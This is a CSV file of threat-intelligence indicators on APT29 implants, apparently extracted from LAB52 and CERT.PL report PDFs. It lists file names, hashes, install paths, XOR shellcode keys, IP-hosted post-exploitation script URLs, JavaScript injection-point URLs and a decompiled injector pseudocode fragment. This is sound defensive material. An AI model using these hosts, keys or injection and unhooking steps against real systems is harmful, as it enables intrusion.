1.0.0,actor--apt29,artifact--sha256:d44e4b0ff978a909edcb157a59339d314e9fc23a4a025638f8bc760de4b19c8b,observation--sha256:70e12e2e78e75d8f8754d3fb7888feb284342281da7b6e5fd39bae45d15f222c,file-name,Implant4.exe,Implant4.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:d44e4b0ff978a909edcb157a59339d314e9fc23a4a025638f8bc760de4b19c8b,observation--sha256:fc1945f51a3593a1660ab81530fe51655542031988af0c797f2bf12e27fb5798,file-name,Implant4.exe,Implant4.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:d44e4b0ff978a909edcb157a59339d314e9fc23a4a025638f8bc760de4b19c8b,observation--sha256:f6364add10b8098ce234f4245955c2b6007a9f267a5a88a618df5ffbf7f05c87,file-name,Implant4.exe,Implant4.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:d44e4b0ff978a909edcb157a59339d314e9fc23a4a025638f8bc760de4b19c8b,observation--sha256:a13f90eef22454f02d56f560f26626ed0783d9c9e1bce40cc9eb58c39f456d7c,file-name,Implant4.exe,Implant4.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:6986e1d8086c5ba7e22dfddaae2f4f9a716b1bb2e0fab1002feeb9e46c5d8f8a,observation--sha256:99bdbfe4d1d42c1d531837ae9b38ae65063cffb9b49bfea08880788d04693343,file-name,Implant5.exe,Implant5.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:6986e1d8086c5ba7e22dfddaae2f4f9a716b1bb2e0fab1002feeb9e46c5d8f8a,observation--sha256:84a5638587307eef789802458d830ea95f3bbf595445c5a9a79b9c24ce9cee33,file-name,Implant5.exe,Implant5.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:6986e1d8086c5ba7e22dfddaae2f4f9a716b1bb2e0fab1002feeb9e46c5d8f8a,observation--sha256:485e306ec074724d773eb44164e76f54298a4ffbf29d5026edf4c19a1313c0f9,file-name,Implant5.exe,Implant5.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:6986e1d8086c5ba7e22dfddaae2f4f9a716b1bb2e0fab1002feeb9e46c5d8f8a,observation--sha256:6f8eb95e66fc3e0619620b4510e69c5d86a75c4ca6972a79ac86373dcd0e8fd2,file-name,Implant5.exe,Implant5.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:d816778595a6b6026ca37e885103f585f16fda12f6fc58b8a5f12e7994fd0c71,observation--sha256:2b561beba6bacdffd488289835f4ec857c624093c53cb7efe654da713a83d7b1,file-name,Implant6.exe,Implant6.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:d816778595a6b6026ca37e885103f585f16fda12f6fc58b8a5f12e7994fd0c71,observation--sha256:bd7e3f3d6ea39b9de83239997184737c89f30e9a0dd3315d81fab78f473288d4,file-name,Implant6.exe,Implant6.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:d816778595a6b6026ca37e885103f585f16fda12f6fc58b8a5f12e7994fd0c71,observation--sha256:da6473ad6e8856308aa280285da3d52fbbcdee30a9d639d815c4c2c2e012490c,file-name,Implant6.exe,Implant6.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:d816778595a6b6026ca37e885103f585f16fda12f6fc58b8a5f12e7994fd0c71,observation--sha256:475050656645edcd5356bc30c2f8c8de96b5b018a6e3efbd13981d5df7c9a6c4,file-name,Implant6.exe,Implant6.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:c9f666917f08e52451deb6d79000f8db5334a885e9ca6f3ff74137c1280aacf6,observation--sha256:5c4182afbc1ff9d7e7cca9eda59d4bac7d4b2ffff6d1115c3b5fa83b75a98cb8,file-name,Implant7.exe,Implant7.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:c9f666917f08e52451deb6d79000f8db5334a885e9ca6f3ff74137c1280aacf6,observation--sha256:c919c9762e8c2d344526b47ca5578313a5cbd73e98c58eb2f05e4e519cf532a6,file-name,Implant7.exe,Implant7.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:c9f666917f08e52451deb6d79000f8db5334a885e9ca6f3ff74137c1280aacf6,observation--sha256:49590524f5eac7c994e2e484703e8f247ddbe180393d78a319e7935dd24d4a24,file-name,Implant7.exe,Implant7.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:c9f666917f08e52451deb6d79000f8db5334a885e9ca6f3ff74137c1280aacf6,observation--sha256:66f12de20d179b059683c931d4d3266bf36e4863a9f417b7ef0b3c82cded62bc,file-name,Implant7.exe,Implant7.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:11b59924e33dccb2de5b4d6fd7985d518bc011f92f24da7c25cd4445e31b5af3,observation--sha256:af3f0f11da3fda34a9be42f485ce68b85ae5b8f93ce63fa1440fe45bebc6d918,file-name,Implant8.exe,Implant8.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:11b59924e33dccb2de5b4d6fd7985d518bc011f92f24da7c25cd4445e31b5af3,observation--sha256:5fcc2d356720d11cd1621262e89a568a8b1580da47130ed24922247ae6b6267a,file-name,Implant8.exe,Implant8.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:11b59924e33dccb2de5b4d6fd7985d518bc011f92f24da7c25cd4445e31b5af3,observation--sha256:1dc3768b7293021747fd5a303e9ef6037edea74b24d4b7e222be834f17a9b4a9,file-name,Implant8.exe,Implant8.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:11b59924e33dccb2de5b4d6fd7985d518bc011f92f24da7c25cd4445e31b5af3,observation--sha256:1afb04277c4d69f0d515caaa1b2b46a82585493aa5a08d81f3960466f1cf82a3,file-name,Implant8.exe,Implant8.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:f25ff67c3442f4b864fd0c5024af47350db2f86c1285398d7dcd05adefc43724,observation--sha256:823e10dd5fee32381bde72f3fe20c190188130dad0e9104cee77f61a9d226a77,file-name,Implant9.exe,Implant9.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5211 Table 1. List of implants NAME ACCESS11 Implant1.exe Private Implant2.exe Private Implant3.exe Private Implant4.exe Private Implant5.exe Private Implant6.exe Private Implant7.exe Private Implant8.exe Private Implant9.exe Private Implant10.exe Private 1 Private means that the sample has not been found in VirusTotal or other public sources consulted. The first evidence of APT29 dates to 2008, during the Second Chechen War, with a very notable compromise attributed to them in 2015",
1.0.0,actor--apt29,artifact--sha256:f25ff67c3442f4b864fd0c5024af47350db2f86c1285398d7dcd05adefc43724,observation--sha256:0c1feca14c3cf58264da35f238253b2ebf3148b2ff3d2c58ebbdf7aa350739a8,file-name,Implant9.exe,Implant9.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:f25ff67c3442f4b864fd0c5024af47350db2f86c1285398d7dcd05adefc43724,observation--sha256:c1a8e4bcae35cf11b7d1fcde48178444e6cbfcaccd487f17a4be7f58faf60101,file-name,Implant9.exe,Implant9.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5215 NAME SIZE ENTROPY F . COMPILATION TOOL Implant1.exe 1,43 MB 7, 109 02/05/2008 Visual Studio 2012 11.0 Implant2.exe 1,35 MB 7,086 25/06/2007 Visual Studio 2005 8.0 Implant3.exe 1,28 MB 7, 123 23/01/2009 Visual Studio 2008 9.0 Implant4.exe 1,59 MB 7,091 20/01/2004 Visual Studio 2010 10. 10 Implant5.exe 1,52 MB 7, 132 28/07/2001 Visual Studio 2008 9.0 Implant6.exe 1,37 MB 7,042 10/02/2015 Visual Studio 2010 10. 10 Implant7.exe 1,39 MB 7,067 08/06/2005 Visual Studio 2015 14.0 Impla",
1.0.0,actor--apt29,artifact--sha256:f25ff67c3442f4b864fd0c5024af47350db2f86c1285398d7dcd05adefc43724,observation--sha256:0748246b12b638d5fdf1692baa1e571a99099bf2a46591db9cf63540b067959a,file-name,Implant9.exe,Implant9.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5229 DECODE SHELLCODE Once the above algorithm has been executed, the “DECODE SHELLCODE” function begins to decrypt the code content using the generated key. The following table shows the different XOR keys for each of the samples. As we can see, this key can vary in size. Table 4. XOR keys for each sample NAME XOR KEY Implant1.exe 6F 19 5B DB C2 50 43 3C 1D 12 42 44 F4 A9 B3 EF 7B 65 D4 C7 0A 13 E6 D8 58 BC F7 96 D7 D7 4D 1B 6E 2D 8E E4 CA 7E 3C C4 6A 2D 8E E4 CA 7E Implant2.exe 08",
1.0.0,actor--apt29,artifact--sha256:de95091b7fdecd4f8eedf7a70c7224e69ec8e90ee01431a64d0a788ca03b3fa0,observation--sha256:260d1d875f6840b5cf48f872146b68808919a4fb5137c35b8678cb576a008675,file-name,Instructions.lnk,Instructions.lnk,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/24 Container File – ZIP In October 2022, the adversary used a ZIP archive to deliver SNOWYAMBER. Schedule.zip contained the following files: . ├── 7za.dll ├── november_schedul exe.pdf └── vcruntime140.dll Filename november_schedulexe.pdf uses the right-to-left override technique to attempt to mimic the pdf extension while in fact, it is .exe. The file is a renamed, legitimate 7-zip executable. Vcruntime140.dll is a benign, although modi",
1.0.0,actor--apt29,artifact--sha256:d52baea3e382a4e5b280ae12a1a444c2f37e1637e6b734f1954c504de42a01fe,observation--sha256:48023668c9073476333aecbe07c9b3a0fa55cbe4d014f352161f5c1b9f0020b1,file-name,Invite.exe,Invite.exe,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/11 Indicator Value Virtual disc container File Name Invite.iso File Size 6464KB MD5 1609bcb75babd9a3e823811b4329b3b9 SHA1 86dcdf623d0951e2f804c9fb4ef816fa5e6a22c3 SHA256 91b42488d1b8e5b547b945714c76c2af16b9566b35757bf055cec1fee9dff1b0 Indicator Value Legitimate executable used to load the malicious DLL File Name Invite.exe File Size 5380KB MD5 d2027751280330559d1b42867e063a0f SHA1 15511f1944d96b6b51291e3a68a2a1a560d95305 SHA256 35271a5d,
1.0.0,actor--apt29,artifact--sha256:d52baea3e382a4e5b280ae12a1a444c2f37e1637e6b734f1954c504de42a01fe,observation--sha256:a24a1fd90d9325b63207f1f6ec44f1a0a49b2b4e46a10264fedf35bbb6517531,file-name,Invite.exe,Invite.exe,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 32/36 Indicator Value Virtual disc container File Name Invite.iso File Size 6464KB MD5 1609bcb75babd9a3e823811b4329b3b9 SHA1 86dcdf623d0951e2f804c9fb4ef816fa5e6a22c3 SHA256 91b42488d1b8e5b547b945714c76c2af16b9566b35757bf055cec1fee9dff1b0 Indicator Value Legitimate executable used to load the malicious DLL File Name Invite.exe File Size 5380KB MD5 d2027751280330559d1b42867e063a0f SHA1 15511f1944d96b6b51291e3a68a2a1a560d95305 SHA256 35271a5,
1.0.0,actor--apt29,artifact--sha256:397f204f135d0f5aa7b227be64ad52af884d7194168be0a53ef0bcd929266c30,observation--sha256:6267bafc952520616816cee456f48f1a81c0b9b5c940314ec19aa81b4511770e,file-name,Invoke-Mimikatz.ps1,Invoke-Mimikatz.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:e8f2f37a417b11589632ae24d87532db865caf80f7b23bd26764a2e6999c1713,observation--sha256:b01a0807684aa2f9ef23b51ba8dde24e065f2361f85afcf60fec63f1fd804462,file-name,IpfHelper.exe,IpfHelper.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
